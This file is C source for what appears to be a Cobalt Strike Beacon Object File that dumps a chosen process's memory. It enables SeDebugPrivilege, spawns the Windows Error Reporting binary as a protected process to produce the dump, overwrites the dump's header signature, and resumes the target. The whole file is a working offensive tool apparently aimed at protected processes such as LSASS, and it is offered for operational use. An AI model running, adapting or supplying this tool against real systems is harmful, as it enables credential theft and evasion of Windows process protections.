#include <windows.h>
#include "WerDump.h"

// Handle pointer in decimal
char* HandleToDecimal(HANDLE h) {
  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return 0;
  }

  size_t bufferSize = 32; // Sufficient for a HANDLE (64bit) in decimal
  char* buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize * sizeof(char));
  if (!buffer) {
      return NULL;
  }
  MSVCRT$sprintf_s(buffer, bufferSize, "%llu", (unsigned long long)h);

end:
  KERNEL32$CloseHandle(hHeap);
  return buffer;
}

// Convert Wchar_t* to char* to output
VOID PrintAchar(char* text) {
  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return;
  }

  // Now print the converted string
  BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
  KERNEL32$CloseHandle(hHeap);
}

// Enable Debug privilege
BOOL EnableDebugPrivilege() {
  HANDLE hToken = NULL;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL bReturnValue = FALSE;

  if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to open process token!\n");
    goto end;
  }
  if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get privilege value!\n");
    goto end;
  }
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get adjust privilege!\n");
    goto end;
  }
  if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Some error, Check me out!\n");
    goto end;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SeDebugPrivilege\n");
  bReturnValue = TRUE;

end:
  if (hToken) {
    KERNEL32$CloseHandle(hToken);
  }
  return bReturnValue;
}

// Get PPL Status
BOOL ProcessGetProtectionLevel(DWORD dwProcessId, PDWORD pdwProtectionLevel)
{
	BOOL bReturnValue = FALSE;
	HANDLE hProcess = NULL;
	PROCESS_PROTECTION_LEVEL_INFORMATION level = { 0 };
	if (!(hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)))
	{
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Open Process to PID: [%d]\n", dwProcessId);
		goto end;
	}
	if (!KERNEL32$GetProcessInformation(hProcess, ProcessProtectionLevelInfo, &level, sizeof(level)))
	{
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Get Process Information Of PID: [%d]\n", dwProcessId);
		goto end;
	}
	*pdwProtectionLevel = level.ProtectionLevel;
	bReturnValue = TRUE;

end:
	if (hProcess)
		KERNEL32$CloseHandle(hProcess);

	return bReturnValue;
}

// Create Process as PPL
BOOL CreatePPLProcess(DWORD Plevel, char* Path) {
  SIZE_T size = 0;

  STARTUPINFOEXW siex = { 0 };
  siex.StartupInfo.cb = sizeof(siex);
  PROCESS_INFORMATION pi = { 0 };
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
  HANDLE hProcess, hThread;
  DWORD dwProtectionLevel, Result, Exitcode;


  if (!KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &size) && KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Initialize Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }

  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return FALSE;
  }

  lpAttributeList = KERNEL32$HeapAlloc(hHeap, 0, size);
  if (!lpAttributeList) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Allocate Memory for Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }

  if (!KERNEL32$InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &size)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Initialize Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }

  if (!KERNEL32$UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &Plevel, sizeof(Plevel
), NULL, NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Update Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }

  siex.lpAttributeList = lpAttributeList;

  // Create Process
  if (!KERNEL32$CreateProcessA(NULL, Path, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS, NULL, NULL, &siex.StartupInfo, &pi)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to CreateProcessA: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }


  // Free
  KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
  KERNEL32$HeapFree(hHeap, 0, lpAttributeList);

  hProcess = pi.hProcess;
  hThread = pi.hThread;

  if (!ProcessGetProtectionLevel(pi.dwProcessId, &dwProtectionLevel)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Something went wrong, when getting protection level\n");
    return FALSE;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! Created PPL Process With Pid: [%d], Protection Level [%d]\n", pi.dwProcessId, dwProtectionLevel);

  Result = KERNEL32$WaitForSingleObject(hProcess, INFINITE);
  if (Result == WAIT_OBJECT_0) {
    KERNEL32$GetExitCodeProcess(hProcess, &Exitcode);
    //BeaconPrintf(CALLBACK_OUTPUT, "[+] PPL Process exit with code: [%d]\n", Exitcode);
  }

  //BeaconPrintf(CALLBACK_OUTPUT, "[+] Created Process Result code: [%d]\n", Result);
  return TRUE;
}

DWORD GetMainThreadId(DWORD pid) {

    PVOID buffer = NULL;
    ULONG bufferSize = 64 * 1024; // 64KB
    NTSTATUS STATUS;
    const ULONG MAX_BUFFER_SIZE = 16 * 1024 * 1024; //16MB limit
    DWORD mainThreadId = 0;

    // Get Process Heap
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (!hHeap) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
        return 0;
    }

    do {
        // Allocate memory using HeapAlloc
        buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed: %d\n", KERNEL32$GetLastError());
            return 0;
        }

        // Query system information
        STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (STATUS == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            KERNEL32$HeapFree(hHeap, 0, buffer);
            bufferSize *= 2;

            // Prevent runaway buffer size
            if (bufferSize > MAX_BUFFER_SIZE) {
                BeaconPrintf(CALLBACK_ERROR, "Buffer size exceeded maximum limit (%u bytes)\n", MAX_BUFFER_SIZE);
                return 0;
            }
        } else if (STATUS != 0) { // Other errors
            KERNEL32$HeapFree(hHeap, 0, buffer);
            BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation failed: 0x%08X\n", STATUS);
            return 0;
        }
    } while (STATUS == 0xC0000004);

    // Process the SYSTEM_PROCESS_INFORMATION structure to find the main thread
    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (procInfo->NextEntryOffset || procInfo->UniqueProcessId) {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == pid) {
            // Found the process, get the first thread (often the main thread)
            if (procInfo->NumberOfThreads > 0) {
                mainThreadId = (DWORD)(ULONG_PTR)procInfo->Threads[0].ClientId.UniqueThread;
                break;
            }
        }
        if (!procInfo->NextEntryOffset) break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)procInfo + procInfo->NextEntryOffset);
    }

    if (mainThreadId == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Main thread not found for PID %u\n", pid);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Main thread ID for PID %u: %u\n", pid, mainThreadId);
    }

    // Clean up
    KERNEL32$HeapFree(hHeap, 0, buffer);
    return mainThreadId;
}

// Create Thread to independently run ResumeProcess
BOOL ResumeProcessThread(DWORD dwProcessId) {
  HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, dwProcessId);
  if (!hProcess) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open process with PROCESS_SUSPEND_RESUME, retrying...\n");
  }
  //BeaconPrintf(CALLBACK_ERROR, "[+] Opened a handle to PID: %d\n", dwProcessId);
  
  NTSTATUS STATUS = NTDLL$NtResumeProcess(hProcess);
  if (STATUS == 0x00) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully resumed process %d\n", dwProcessId);
    KERNEL32$CloseHandle(hProcess);
    return TRUE; // Success, exit the thread
  }

  BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resume process\n");
  KERNEL32$CloseHandle(hProcess);

  return FALSE;
}

DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, char werPath[MAX_PATH], char werDump[MAX_PATH], unsigned char werSig[MAX_PATH]) {
  DWORD dwProtectionLevel = 0;

  SECURITY_ATTRIBUTES sa = {};
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  HANDLE hDump = KERNEL32$CreateFileA(werDump, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  HANDLE hEncDump = KERNEL32$CreateFileA("enc.dump", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE)
  {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileA failed: %d\n", KERNEL32$GetLastError());
  }

  HANDLE hCancel = KERNEL32$CreateEventA(&sa, TRUE, FALSE, NULL);
  if (!hCancel)
  {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventA failed: %d\n", KERNEL32$GetLastError());
    KERNEL32$CloseHandle(hDump);
    KERNEL32$CloseHandle(hEncDump);
    return 1;
  }
  
  size_t cmdSize = 1024; // Adjust based on expected length
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
    BeaconPrintf(CALLBACK_ERROR, "[!] GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
    return 1;
  }

  char* commandLine = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cmdSize * sizeof(char));
  if (!commandLine) {
      return 1; // Handle allocation failure
  }

  // Convert handles to decimal strings
  char* hDumpStr = HandleToDecimal(hDump);
  char* hEncDumpStr = HandleToDecimal(hEncDump);
  char* hCancelStr = HandleToDecimal(hCancel);

  if (!hDumpStr || !hEncDumpStr || !hCancelStr) {
      BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert to handle decimal\n");
      goto end;
      return 1; // Handle allocation failure
  }

  // Build the command line using sprintf
  int result = MSVCRT$sprintf_s(
      commandLine,
      cmdSize,
      "\"%s\" /h /pid %d /tid %d /file %s /encfile %s /cancel %s /type 268310",
      werPath,
      dwProcessId,
      dwProcessTid,
      hDumpStr,
      hEncDumpStr,
      hCancelStr
  );
  if (result < 0) {
      BeaconPrintf(CALLBACK_ERROR, "[!] sprintf_s failed\n");
      goto end;
  }

  //PrintAchar(commandLine);

  BOOL status = CreatePPLProcess(dwProtectionLevel, commandLine);
  if (!status) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Cannot Create PPL process :(\n");
    goto end;
  }

  KERNEL32$SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
  DWORD bytes;
  if (!KERNEL32$WriteFile(hDump, werSig, 4, &bytes, NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed: %d\n", KERNEL32$GetLastError());
    goto end;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully Dumped process %d, Find the dump in the following path %s \n", dwProcessId, werDump);

  ResumeProcessThread(dwProcessId);

end:
  // Clean up
  KERNEL32$HeapFree(hHeap, 0, commandLine);
  KERNEL32$HeapFree(hHeap, 0, hDumpStr);
  KERNEL32$HeapFree(hHeap, 0, hEncDumpStr);
  KERNEL32$HeapFree(hHeap, 0, hCancelStr);
  KERNEL32$CloseHandle(hDump);
  KERNEL32$CloseHandle(hEncDump);
  KERNEL32$CloseHandle(hCancel);
  KERNEL32$DeleteFileA("enc.dump");
  return 0;
  
}

void go(IN PCHAR args, IN ULONG argc) {
  datap parser;
  BeaconDataParse(&parser, args, argc);
  
  unsigned char * werPath = BeaconDataExtract(&parser, NULL);
  DWORD dwProcessId = BeaconDataInt(&parser);
  unsigned char * werDump = BeaconDataExtract(&parser, NULL);
  unsigned char * werSig = BeaconDataExtract(&parser, NULL);

  if (!EnableDebugPrivilege()) {
      BeaconPrintf(CALLBACK_ERROR, "[+] Failed to enable SeDebugPrivilege\n");
      return;
  }

  DWORD dwProcessTid = GetMainThreadId(dwProcessId);
  if (WerDump(dwProcessTid, dwProcessId, werPath, werDump, werSig) != 0) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to dump\n");
  }
  return;
}
